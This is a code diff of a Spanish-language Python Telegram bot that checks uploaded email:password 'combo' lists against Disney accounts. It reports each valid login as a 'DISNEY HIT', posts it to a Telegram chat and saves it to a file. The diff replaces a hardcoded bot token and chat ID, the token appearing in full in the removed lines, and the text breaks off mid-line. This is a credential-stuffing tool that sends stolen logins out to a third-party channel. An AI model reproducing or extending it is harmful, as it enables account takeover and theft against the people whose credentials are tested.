@@ -2,10 +2,10 @@ import requests
 import telebot
 from telebot import types
 
-token = "7331534819:AAHIn4WmF0J4qtveGQ7rnD1F8RiDYu940Es"  
-CHAT_ID = '5947916142'  
+# Solicitar el token del bot y el chat ID en la terminal
+token = input("Introduce el token del bot: ")
+CHAT_ID = input("Introduce el chat ID: ")
 bot = telebot.TeleBot(token, parse_mode="HTML")
-
 
 def ahmed(file):
     hits = 0
@@ -128,7 +128,6 @@ def ahmed(file):
                         tlg = f'''DISNEY HIT \n  ┌ Correo ⇝{email} \n ├ Contraseña ⇝ {password} | \n BY : @HenrryOfc'''
                         print("\033[32m" + tlg + "\033[0m")
 
-                        
                         bot.send_message(chat_id=CHAT_ID, text=tlg)
 
                         with open('Diszny.txt', 'a') as x:
@@ -149,41 +148,12 @@ def ahmed(file):
 
     return hits, bad
 
-
 @bot.message_handler(commands=["start"])
 def start(message):
     bot.reply_to(message, "Enviar solo el archivo con")
-
 
 @bot.message_handler(content_types=["document"])
 def main(message):
     hits, bad = 0, 0
     ko = bot.reply_to(message, "Checking Your Email...⌛").message_id
-    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
-
-    with open("combo.txt", "wb") as w:
-        w.write(ee)
-
-    try:
-        with open("combo.txt", 'r') as f:
-            lines = f.readlines()
-            total = len(lines)
-            for line in lines:
-                password = line.split(":")[1]
-                email = line.split(":")[0]
-
-                mes = types.InlineKeyboardMarkup(row_width=1)
-                cm1 = types.InlineKeyboardButton(f"• Hits ✅ : [{hits}] •", callback_data='x')
-                cm2 = types.InlineKeyboardButton(f"• Bad ❌ : [ {bad} ] •", callback_data='x')
-                cm5 = types.InlineKeyboardButton(f"• Total : [ {total} ] •", callback_data='x')
-                mes.add(cm1, cm2, cm5)
-                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=''' BY ➜ @HenrryOfc ''', reply_markup=mes)
-
-                hits, bad = ahmed("combo.txt")
-
-    except Exception as e:
-        print("Error:", e)
-
-
-print('Done')
-bot.infinity_polling()
+    ee = bot.download_file(bot.get_file(message
